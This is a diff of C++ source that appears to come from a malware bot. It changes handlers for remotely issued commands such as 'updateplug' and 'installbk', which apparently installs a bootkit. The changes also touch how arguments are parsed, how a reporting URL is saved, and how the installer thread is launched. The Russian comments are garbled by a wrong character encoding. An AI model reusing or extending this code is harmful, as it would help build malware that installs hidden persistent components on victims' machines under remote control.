@@ -840,7 +840,7 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
 //---------------------------------------------------------------------------
 const char* Plugin::CommandUpdatePlug    = "updateplug";
 const char* Plugin::CommandInstallBk     = "installbk";
-const char* Plugin::CommandInstallBkStat = "installbkstat";
+const char* Plugin::CommandInstallBkStat = "install-bk-with-report";
 
 
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
@@ -1012,14 +1012,14 @@ bool IsDelimiterChar(char ch)
 	return (' ' == ch || '\0' == ch);
 }
 
-// ¬озвращает строку, созданную посредством STR::New
-string GetArgumentFromArgumentListByIndex(PCHAR ArgList, DWORD ArgIndex)
+// ¬озвращает параметр из списка по индексу.
+string Plugin::GetParamFromParamListByIndex(const char* ParamList, DWORD ArgIndex)
 {
-	DWORD  param_counter = 0;
-	PCHAR  Cur   = ArgList;
+	DWORD        ParamCounter = 0;
+	const char*  Cur   = ParamList;
 
 	// Ќадо учесть, что в парсинге нужен конечный '\0' символ
-	PCHAR  Limit = ArgList + m_lstrlen(ArgList) + 1; 
+	const char*  Limit = ParamList + m_lstrlen(ParamList) + 1; 
 
 	while (Cur < Limit)
 	{
@@ -1033,8 +1033,8 @@ string GetArgumentFromArgumentListByIndex(PCHAR ArgList, DWORD ArgIndex)
 
 		// ”слови€ предусматривающие наличие нескольких разделителей между 
 		// параметрами.
-		if (param_counter == ArgIndex && param.Length() > 0) return param;
-		if (param.Length() > 0) param_counter++;
+		if (ParamCounter == ArgIndex && param.Length() > 0) return param;
+		if (param.Length() > 0) ParamCounter++;
 		
 		Cur++;
 	}
@@ -1042,25 +1042,19 @@ string GetArgumentFromArgumentListByIndex(PCHAR ArgList, DWORD ArgIndex)
 	return string();
 }
 
+
 bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 {
 	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
 
-	PCHAR ArgsCopy = STR::New(Args);
+	PCHAR ParamList = STR::New(Args);
 
-	string PlugName   = GetArgumentFromArgumentListByIndex(ArgsCopy, 0);
-	string StatPrefix = GetArgumentFromArgumentListByIndex(ArgsCopy, 1);
-	string StatUrl    = GetArgumentFromArgumentListByIndex(ArgsCopy, 2);
+	string PlugName = GetParamFromParamListByIndex(ParamList, 0);
 
-	PDBG("ExecuteInstallBkStat",
-		"Parsing arguments results: PlugName='%s' StatPrefix='%s' StatUrl='%s'",
-		PlugName.t_str(), StatPrefix.t_str(), StatUrl.t_str()
-		);
-
-	DebugReportSaveSettings(true, StatPrefix.t_str(), StatUrl.t_str());
+	DebugReportSaveSettings(ParamList);
 
 	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));
 
-	STR::Free(ArgsCopy);
+	STR::Free(ParamList);
 	return true;
 }
